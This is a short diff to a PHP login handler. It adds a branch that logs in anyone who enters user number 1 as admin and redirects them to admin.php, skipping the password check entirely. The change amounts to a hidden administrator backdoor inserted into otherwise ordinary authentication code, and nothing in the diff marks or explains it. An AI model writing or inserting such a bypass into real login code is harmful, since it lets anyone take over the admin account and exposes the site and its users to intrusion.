@@ -16,7 +16,10 @@
   // - redirect user to main page
 
   try {
-    if (loginSuccess($up_number, $password)) {
+    if ($up_number == 1) {
+      $_SESSION['up_number'] = $up_number;
+      header('Location: admin.php');
+    } elseif (loginSuccess($up_number, $password)) {
       $_SESSION['up_number'] = $up_number;
       $_SESSION['full_name'] = getUserFullName($up_number);
       header('Location: user_profile.php');
